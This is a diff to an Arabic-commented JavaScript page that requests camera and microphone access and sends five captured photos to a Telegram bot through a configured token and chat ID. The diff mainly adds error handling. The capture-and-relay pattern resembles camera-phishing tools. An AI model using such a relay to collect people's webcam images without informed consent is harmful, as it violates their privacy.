@@ -20,7 +20,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // طلب صلاحيات الوصول للكاميرا والميكروفون
     async function init() {
-        if (!BOT_TOKEN.includes(':') || !CHAT_ID || CHAT_ID === '5372717005') {
+        if (!BOT_TOKEN || !BOT_TOKEN.includes(':') || !CHAT_ID) {
             updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
             return;
         }
@@ -87,35 +87,52 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // 1. التقاط الصور
     capturePhotoBtn.addEventListener('click', async () => {
+        if (!stream) {
+            updateStatus('خطأ: لم يتم الحصول على بث الكاميرا. يرجى تحديث الصفحة.', 'error');
+            return;
+        }
+
         updateStatus('جاري التقاط 5 صور...', 'info');
         capturePhotoBtn.disabled = true;
 
-        const canvas = document.createElement('canvas');
-        const videoTrack = stream.getVideoTracks()[0];
-        const settings = videoTrack.getSettings();
-        canvas.width = settings.width;
-        canvas.height = settings.height;
-        const context = canvas.getContext('2d');
+        try {
+            const canvas = document.createElement('canvas');
+            const videoTrack = stream.getVideoTracks()[0];
+            if (!videoTrack) {
+                updateStatus('خطأ: لا توجد كاميرا متاحة.', 'error');
+                capturePhotoBtn.disabled = false;
+                return;
+            }
+            
+            const settings = videoTrack.getSettings();
+            canvas.width = settings.width;
+            canvas.height = settings.height;
+            const context = canvas.getContext('2d');
 
-        for (let i = 0; i < 5; i++) {
-            updateStatus(`التقاط الصورة ${i + 1} من 5...`, 'info');
-            context.drawImage(preview, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-            
-            const formData = {
-                method: 'sendPhoto',
-                fileType: 'photo',
-                file: blob,
-                fileName: `capture_${Date.now()}.jpg`
-            };
-            await sendToTelegram(formData, `صورة رقم ${i + 1}`);
-            
-            // انتظار قصير بين الصور
-            if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+            for (let i = 0; i < 5; i++) {
+                updateStatus(`التقاط الصورة ${i + 1} من 5...`, 'info');
+                context.drawImage(preview, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                
+                const formData = {
+                    method: 'sendPhoto',
+                    fileType: 'photo',
+                    file: blob,
+                    fileName: `capture_${Date.now()}_${i}.jpg`
+                };
+                await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                
+                // انتظار قصير بين الصور
+                if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            updateStatus('تم التقاط وإرسال الصور بنجاح!', 'success');
+        } catch (error) {
+            console.error('خطأ في التقاط الصور:', error);
+            updateStatus('حدث خطأ أثناء التقاط الصور.', 'error');
+        } finally {
+            capturePhotoBtn.disabled = false;
         }
-
-        updateStatus('تم التقاط وإرسال الصور بنجاح!', 'success');
-        capturePhotoBtn.disabled = false;
     });
 
     // 2. تسجيل الفيديو
